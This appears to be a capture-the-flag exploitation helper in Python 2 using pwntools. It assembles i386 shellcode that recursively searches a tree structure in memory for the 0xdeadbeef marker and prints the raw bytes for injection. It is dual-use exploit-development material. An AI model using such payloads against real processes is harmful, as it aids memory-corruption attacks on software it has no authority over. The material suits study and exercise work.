#!/usr/bin/env python2

from pwn import *

def extract_hex(str):
    return int(str[str.index('0x')+2:str.index('.')],16)

context(arch = 'i386', os = 'linux')

SHELLCODE = asm( '''

shellcode:
	push	%ebp
	mov	%esp, %ebp
	sub	$40, %esp
	cmp	$0, 8(%ebp)
	jne	.L2
	mov	$0, %eax
	jmp	.L3
 .L2:
	mov	8(%ebp), %eax
	mov	8(%eax), %eax
	cmp	$-559038737, %eax
	jne	.L4
	mov	8(%ebp), %eax
	add	$12, %eax
	jmp	.L3
 .L4:
	mov	8(%ebp), %eax
	mov	(%eax), %eax
	mov	%eax, (%esp)
	call	shellcode
	mov	%eax, -12(%ebp)
	cmp	$0, -12(%ebp)
	je	.L5
	mov	-12(%ebp), %eax
	jmp	.L3
 .L5:
	mov	8(%ebp), %eax
	mov	4(%eax), %eax
	mov	%eax, (%esp)
	call	shellcode

.L3:
	leave
	ret
''')
print SHELLCODE
